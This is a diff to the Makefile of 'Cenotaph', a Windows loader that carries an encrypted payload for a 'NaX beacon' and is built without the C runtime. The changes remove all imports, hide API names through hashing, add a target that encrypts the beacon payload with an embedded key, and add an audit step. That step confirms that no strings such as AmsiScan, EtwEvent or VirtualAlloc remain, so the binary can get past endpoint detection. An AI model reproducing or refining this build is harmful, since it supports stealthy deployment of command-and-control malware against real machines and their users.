@@ -1,68 +1,80 @@
-# Cenotaph — EDR-fit disk host for the NaX beacon.
+# Cenotaph v3 — clean-slate fallback loader.
 #
-# Cross-compiled on Linux with mingw-w64.  Cenotaph is a *normal* native PE
-# (not PIC shellcode), built with no CRT: -nostdlib + an explicit entry
-# point.  The only linked import lib is kernel32, for two/three mundane
-# IAT imports (GetTickCount, Sleep, CloseHandle).  Everything functional
-# is PEB-walked via FNV1a at runtime — no API name strings in the binary.
-#
-#   make          -> cenotaph.exe       (release, windows subsystem)
-#   make debug     -> cenotaph-debug.exe (console subsystem, for testing)
-#   make audit     -> strings + IAT + undefined-symbol checks
+#   make           -> cenotaph.exe     (release, windows subsystem, stripped)
+#   make debug     -> cenotaph-debug.exe (console, for testing)
+#   make audit     -> zero-import / string checks
 #   make clean
 
-CXX      := x86_64-w64-mingw32-g++
-STRIP    := x86_64-w64-mingw32-strip
-OBJCOPY  := x86_64-w64-mingw32-objcopy
-READELF  := x86_64-w64-mingw32-readelf
-NM       := x86_64-w64-mingw32-nm
+CXX     := x86_64-w64-mingw32-g++
+STRIP   := x86_64-w64-mingw32-strip
+NM      := x86_64-w64-mingw32-nm
+STRINGS := x86_64-w64-mingw32-strings
+OBJDUMP := x86_64-w64-mingw32-objdump
 
-SRC      := src/Ldr.c src/Utils.c src/Host.c
-INC      := -Iinclude
-OBJDIR   := build
+SRC     := src/Ldr.c src/Utils.c src/Host.c
+INC     := -Iinclude
 
-# C++ for constexpr FNV1a hashing (HASH_STR -> compile-time, no name strings).
-CFLAGS   := -Os -fno-asynchronous-unwind-tables -fno-exceptions -fno-rtti \
-            -fno-builtin -fno-ident -fno-stack-protector -fpack-struct=8 \
-            -mno-sse -fpermissive -masm=intel $(INC)
+# Compiler flags: no CRT, no exceptions, no unwind tables, no ident, no stack protector.
+CFLAGS  := -Os -fno-asynchronous-unwind-tables -fno-exceptions -fno-rtti \
+           -fno-builtin -fno-ident -fno-stack-protector -fpack-struct=8 \
+           -mno-sse -fpermissive -masm=intel -Wall $(INC)
 
-# No CRT.  Explicit entry.  Only kernel32 is linked (mundane IAT imports).
-LDFLAGS  := -nostdlib -lkernel32 -Wl,-e,CenotaphEntry -Wl,-s
+# Linker: no CRT, explicit entry, strip, console/windows as needed.
+LDFLAGS_REL := -nostdlib -Wl,-e,CenotaphEntry -Wl,-s -Wl,-subsystem,windows
+LDFLAGS_DBG := -nostdlib -Wl,-e,CenotaphEntry -Wl,-subsystem,console -lkernel32
 
-OBJ      := $(OBJDIR)/Ldr.o $(OBJDIR)/Utils.o $(OBJDIR)/Host.o
+OBJREL  := build/rel
+OBJDBG  := build/dbg
+OBJ_REL := $(patsubst src/%.c,$(OBJREL)/%.o,$(SRC))
+OBJ_DBG := $(patsubst src/%.c,$(OBJDBG)/%.o,$(SRC))
 
-.PHONY: all debug audit clean
+.PHONY: all debug payload audit clean
 
-all: $(OBJDIR) cenotaph.exe
+all: cenotaph.exe
 
-debug: CFLAGS += -DCENOTAPH_SANDBOX_CHECK=0 -g
-debug: LDFLAGS := -nostdlib -lkernel32 -Wl,-e,CenotaphEntry -Wl,-subsystem,console
-debug: $(OBJDIR) cenotaph-debug.exe
+debug: cenotaph-debug.exe
 
-$(OBJDIR):
-	mkdir -p $(OBJDIR)
+# Encrypt a raw payload into the .dat + regenerate the embedded key header.
+# ALWAYS rebuild afterwards so the binary embeds the matching key:
+#   make payload PAYLOAD=NaX/build/nax.x64.debug.bin DAT=cenotaph-debug.dat
+#   make debug && make
+PAYLOAD ?= build/nax.x64.bin
+DAT     ?= cenotaph-debug.dat
+payload:
+	python3 tools/encrypt.py --payload $(PAYLOAD) --dat $(DAT) --header include/CenKey.h
+	@echo "[!] key changed - rebuild now: make debug && make"
 
-$(OBJDIR)/%.o: src/%.c
+$(OBJREL):
+	mkdir -p $(OBJREL)
+
+$(OBJDBG):
+	mkdir -p $(OBJDBG)
+
+$(OBJREL)/%.o: src/%.c | $(OBJREL)
 	$(CXX) $(CFLAGS) -c $< -o $@
 
-cenotaph.exe: $(OBJ)
-	$(CXX) $(CFLAGS) $(OBJ) -o $@ $(LDFLAGS) -Wl,-subsystem,windows
+$(OBJDBG)/%.o: src/%.c | $(OBJDBG)
+	$(CXX) $(CFLAGS) -DCENOTAPH_DEBUG=1 -g -c $< -o $@
+
+# Host.c embeds the key; a regenerated CenKey.h must force a rebuild.
+$(OBJREL)/Host.o $(OBJDBG)/Host.o: include/CenKey.h
+
+cenotaph.exe: $(OBJ_REL)
+	$(CXX) $(CFLAGS) $(OBJ_REL) -o $@ $(LDFLAGS_REL)
 	$(STRIP) $@ 2>/dev/null || true
 
-cenotaph-debug.exe: $(OBJ)
-	$(CXX) $(CFLAGS) $(OBJ) -o $@ $(LDFLAGS)
+cenotaph-debug.exe: $(OBJ_DBG)
+	$(CXX) $(CFLAGS) -DCENOTAPH_DEBUG=1 -g $(OBJ_DBG) -o $@ $(LDFLAGS_DBG)
 
-# ---- audit: prove no API name strings, minimal IAT, clean undefineds ----
 audit: cenotaph.exe
 	@echo "=== size ==="; ls -l cenotaph.exe | awk '{print $$5" bytes"}'
-	@echo "=== API-name string scan (must be EMPTY) ==="; \
-	  strings -a cenotaph.exe | grep -iE 'NtAllocate|NtProtect|NtQuerySystem|TpAllocWork|TpPostWork|TpReleaseWork|VirtualAlloc|VirtualProtect|LoadLibrary|GetProcAddress|CreateFile|ReadFile|GetModuleFileName|GetFileSize|AmsiScan|EtwEvent' || echo "(empty — PASS)"
-	@echo "=== IAT imports (should be only mundane kernel32: GetTickCount/Sleep/CloseHandle) ==="; \
-	  $(OBJCOPY) -O binary --only-section=.idata cenotaph.exe /dev/stdout 2>/dev/null | strings | sort -u || true
-	@echo "=== undefined symbols (must be empty: no CRT, no bare libc) ==="; \
+	@echo "=== imports (must be EMPTY) ==="; \
+	  $(OBJDUMP) -p cenotaph.exe | awk '/The Import Tables/{flag=1} flag' | head -20 ; \
+	  $(OBJDUMP) -p cenotaph.exe | grep -E 'DLL Name|\.dll' || echo "(none - PASS)"
+	@echo "=== API strings (must be EMPTY) ==="; \
+	  $(STRINGS) -a cenotaph.exe | grep -iE 'NtAllocate|NtProtect|NtClose|VirtualAlloc|VirtualProtect|LoadLibrary|GetProcAddress|CreateFile|ReadFile|GetModuleFileName|GetFileSize|Sleep|CloseHandle|AmsiScan|EtwEvent' || echo "(empty - PASS)"
+	@echo "=== undefineds (must be empty) ==="; \
 	  $(NM) -u cenotaph.exe 2>/dev/null || echo "(none)"
-	@echo "=== entry point ==="; \
-	  $(READELF) -h cenotaph.exe 2>/dev/null | grep -i 'Entry point' || true
 
 clean:
-	rm -rf $(OBJDIR) cenotaph.exe cenotaph-debug.exe
+	rm -rf build cenotaph.exe cenotaph-debug.exe
